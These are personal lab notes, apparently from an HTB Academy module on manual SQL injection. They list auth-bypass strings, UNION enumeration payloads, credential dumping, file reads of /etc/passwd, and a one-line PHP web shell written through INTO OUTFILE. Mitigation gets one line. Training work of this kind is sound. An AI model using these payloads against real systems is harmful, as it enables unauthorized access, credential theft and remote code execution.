# 17 — SQL Injection Fundamentals

> **Path Phase:** Web Attacks | **Difficulty:** Medium | **Sections:** 17

Manual SQL injection from the ground up — subverting query logic, UNION injection, DB enumeration, reading/writing files.

> ℹ️ `{TARGET}` = target. Flags withheld per HTB Academy policy.

---

## Table of Contents
1. Introduction
2. Intro to Databases
3. Types of Databases
4. Intro to MySQL
5. SQL Statements
6. Query Results
7. SQL Operators
8. Intro to SQL Injections
9. Subverting Query Logic
10. Using Comments
11. Union Clause
12. Union Injection
13. Database Enumeration
14. Reading Files
15. Writing Files
16. Mitigating SQL Injection
17. Skills Assessment

---

## 2–7 — Database & MySQL Basics
```sql
mysql -u root -p -h {TARGET}
SHOW DATABASES; USE db; SHOW TABLES;
SELECT * FROM users WHERE username='admin';
-- Operators: AND, OR, LIKE, =, !=
```

## 8–9 — Subverting Query Logic (Auth Bypass)
```sql
-- In the username field:
admin' or '1'='1
admin'-- -
' or 1=1-- -
```
> **Auth bypass:** ✅ Completed in lab (flag withheld per HTB Academy policy)

## 10 — Using Comments
```sql
admin'-- -           -- inline comment (note trailing space)
admin'#               -- hash comment
```

## 11–12 — UNION Clause & Injection
```sql
-- 1. Find column count:
' ORDER BY 1-- -      (increment until error)
' UNION SELECT 1,2,3-- -
-- 2. Extract from displayed columns:
' UNION SELECT 1,database(),version()-- -
```

## 13 — Database Enumeration
```sql
' UNION SELECT 1,database(),user()-- -
' UNION SELECT 1,schema_name,3 FROM information_schema.schemata-- -
' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema='dbname'-- -
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT 1,username,password FROM users-- -
```
> **Dumped creds:** ✅ Completed in lab (withheld per HTB Academy policy)

## 14 — Reading Files
```sql
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -
' UNION SELECT 1,super_priv,3 FROM mysql.user WHERE user='root'-- -
```
> **File read:** ✅ Completed in lab (flag withheld per HTB Academy policy)

## 15 — Writing Files (Web Shell)
```sql
-- Requires FILE priv + writable web dir + secure_file_priv empty:
' UNION SELECT 1,'<?php system($_GET["c"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'-- -
-- Then: http://{TARGET}/shell.php?c=id
```
> **RCE:** ✅ Completed in lab (flag withheld per HTB Academy policy)

## 16 — Mitigation
Prepared statements / parameterized queries, input validation, least-privilege DB user, WAF.

## 17 — Skills Assessment
```sql
' or 1=1-- -
' ORDER BY 5-- -
' UNION SELECT 1,2,database(),4,5-- -
' UNION SELECT 1,LOAD_FILE('/flag.txt'),3,4,5-- -
```
> **Skills Assessment:** ✅ Completed in lab (flag withheld per HTB Academy policy)

---

## 🧰 Tools Used
| Tool | Purpose |
|------|---------|
| `mysql` client | Understanding queries |
| Browser + Burp | Injecting payloads |
| `information_schema` | DB structure enumeration |

## 🔑 Key Takeaways
- **`ORDER BY`** finds column count; **UNION SELECT** extracts data.
- `information_schema` is the map to every DB/table/column.
- `LOAD_FILE` reads files, `INTO OUTFILE` writes web shells (needs FILE priv).
- Do this **manually before SQLMap** — it teaches you what's happening.

---

*Part of my HTB CPTS Portfolio — Zeshan Ali*
